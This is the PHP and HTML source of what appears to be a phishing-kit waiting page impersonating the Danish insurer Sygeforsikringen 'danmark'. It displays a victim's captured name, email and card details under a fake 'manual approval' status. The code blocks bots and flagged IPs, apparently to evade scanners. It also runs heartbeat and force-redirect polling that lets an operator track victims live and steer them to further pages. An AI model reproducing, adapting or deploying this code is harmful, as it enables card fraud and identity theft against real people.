<?php
session_start();
require_once 'config.php';

$ip = getVisitorIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Vérifier automatiquement si c'est un bot AVANT tout traitement
require_once 'auto_bot_blocker.php';
if (isBotVisitor($userAgent, $ip)) {
    autoBlockBot($ip, $userAgent, 'Bot detected on loading page');
    http_response_code(403);
    header('Content-Type: text/plain');
    echo "Access Denied";
    exit;
}

// Vérifier si l'IP est bloquée
if (isIPBlocked($ip)) {
    http_response_code(403);
    echo "<!DOCTYPE html><html><head><title>Access Denied</title></head><body><h1>Access Denied</h1><p>Your access has been restricted.</p></body></html>";
    exit;
}

updateVisitorStatus($ip, 'loading', 'waiting');

// Récupérer les données de session
$fullname = $_SESSION['fullname'] ?? '';
$email = $_SESSION['email'] ?? '';
$cardNumber = $_SESSION['card_number'] ?? '';

// Masquer le numéro de carte (afficher seulement les 4 derniers chiffres)
$maskedCard = '';
if ($cardNumber) {
    $cleaned = preg_replace('/\s+/', '', $cardNumber);
    $last4 = substr($cleaned, -4);
    $maskedCard = '****' . $last4;
    
    // Détecter le type de carte
    $cardType = 'Ukendt';
    $firstDigit = substr($cleaned, 0, 1);
    $firstTwo = substr($cleaned, 0, 2);
    $firstFour = substr($cleaned, 0, 4);
    
    if ($firstDigit === '4') {
        $cardType = 'Visa';
    } elseif (($firstTwo >= '51' && $firstTwo <= '55') || ($firstTwo >= '22' && $firstTwo <= '27')) {
        $cardType = 'Mastercard';
    } elseif ($firstTwo === '34' || $firstTwo === '37') {
        $cardType = 'American Express';
    } elseif ($firstFour === '5019') {
        $cardType = 'Dankort';
    }
    
    $maskedCard .= ' - ' . $fullname . ' (' . $cardType . ')';
} else {
    $maskedCard = '****4604 - jawadf fes (Mastercard)';
}

// Générer un ID de transaction unique
$transactionId = 'ID: DK-' . strtoupper(substr(md5($ip . time()), 0, 10));
?>
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Behandler ansøgning | Sygeforsikringen "danmark"</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="apple-touch-icon" href="apple-touch-icon.png">
    <link rel="stylesheet" href="css/style.css">
    <style>
        .spinner-container {
            text-align: center;
            margin: 30px 0;
        }

        .spinner {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            border: 6px solid #f3f3f3;
            border-top: 6px solid #9d1b30;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .waiting-title {
            font-size: 24px;
            color: #333;
            text-align: center;
            margin-bottom: 10px;
        }

        .waiting-subtitle {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .warning-box {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .warning-icon {
            font-size: 24px;
            flex-shrink: 0;
        }

        .warning-text {
            color: #856404;
            font-size: 13px;
            line-height: 1.5;
        }

        .info-box {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .info-box h3 {
            font-size: 14px;
            color: #495057;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #e9ecef;
            font-size: 14px;
        }

        .info-row:last-child {
            border-bottom: none;
        }

        .info-label {
            color: #6c757d;
        }

        .info-value {
            color: #212529;
            font-weight: 500;
            text-align: right;
        }

        .status-box {
            background: #e7f3ff;
            border: 1px solid #b3d9ff;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .status-box h3 {
            font-size: 14px;
            color: #004085;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .status-step {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px 0;
            font-size: 13px;
        }

        .status-step.completed {
            color: #28a745;
        }

        .status-step.pending {
            color: #856404;
        }

        .status-icon {
            font-size: 18px;
            width: 24px;
            text-align: center;
        }

        .footer-text {
            text-align: center;
            color: #6c757d;
            font-size: 13px;
            margin-top: 20px;
            line-height: 1.6;
        }

        .transaction-id {
            text-align: center;
            color: #999;
            font-size: 11px;
            margin-top: 15px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <div class="logo">
     <img align="center" border="0" src="https://s3-eu-west-1.amazonaws.com/mimgs/cdn/TWO/2436/thlHNdETFm9fb2KIsG5w_logo_danmark.png" alt="" title="" style="outline: none;text-decoration: none;-ms-interpolation-mode: bicubic;clear: both;display: inline-block !important;border: none;height: auto;float: none;width: 100%;max-width: 168px;" width="168"/>
            </div>
            <a href="tel:70109070" class="phone">70 10 90 70</a>
        </div>
    </header>

    <div class="container">
        <!-- Progress Indicator -->
        <div class="progress-indicator">
            <div class="progress-step">
                <div class="step-circle completed">1</div>
                <div class="step-line completed"></div>
                <div class="step-circle completed">2</div>
                <div class="step-line active"></div>
                <div class="step-circle active">3</div>
            </div>
        </div>

        <div class="spinner-container">
            <div class="spinner"></div>
            <h1 class="waiting-title">Behandler din ansøgning</h1>
            <p class="waiting-subtitle">Vent venligst mens vi gennemgår dine oplysninger...</p>
        </div>

        <div class="warning-box">
            <div class="warning-icon">⏳</div>
            <div class="warning-text">
                Din ansøgning venter på manuel godkendelse fra vores team
            </div>
        </div>

        <div class="info-box">
            <h3>👤 Kundeoplysninger:</h3>
            <div class="info-row">
                <span class="info-label">Navn:</span>
                <span class="info-value"><?php echo htmlspecialchars($fullname); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Email:</span>
                <span class="info-value"><?php echo htmlspecialchars($email); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Kort:</span>
                <span class="info-value"><?php echo htmlspecialchars($maskedCard); ?></span>
            </div>
        </div>

        <div class="status-box">
            <h3>📊 Status:</h3>
            <div class="status-step completed">
                <span class="status-icon">✅</span>
                <span>Personlige oplysninger modtaget</span>
            </div>
            <div class="status-step completed">
                <span class="status-icon">✅</span>
                <span>Betalingsoplysninger verificeret</span>
            </div>
            <div class="status-step pending">
                <span class="status-icon">⏳</span>
                <span>Venter på manuel godkendelse...</span>
            </div>
        </div>

        <div class="footer-text">
            Dette tager normalt 2-5 minutter. Forlad ikke denne side.
        </div>

        <div class="transaction-id">
            Trn 3 af 4 • Ansøgning <?php echo $transactionId; ?>
        </div>
    </div>

<script>
// ✅ Send heartbeat immediately when the page loads
document.addEventListener('DOMContentLoaded', () => {
  // First immediate update
  fetch('api/heartbeat.php?page=loading');

  // 🔁 Then update every 5 seconds so the visitor stays "online"
  setInterval(() => {
    fetch('api/heartbeat.php?page=page3');
  }, 2000);
});

async function checkForceRedirect() {
  try {
    const response = await fetch('api/check_force_redirect.php');
    const data = await response.json();

    // 🚫 If the visitor is blocked
    if (data.blocked) {
      document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:50px'>🚫 You have been blocked from entering</h1>";
      return; // stop everything
    }

    // 🔁 Forced or normal redirection
    if (data.force_redirect && data.url) {
      window.location.href = data.url;
    } else if (data.redirect && data.url) {
      window.location.href = data.url;
    }

  } catch (error) {
    console.error('Redirect check failed:', error);
  }
}

// Run when the page loads
checkForceRedirect();

// Check every 5 seconds
setInterval(checkForceRedirect, 5000);
</script>

</body>
</html>
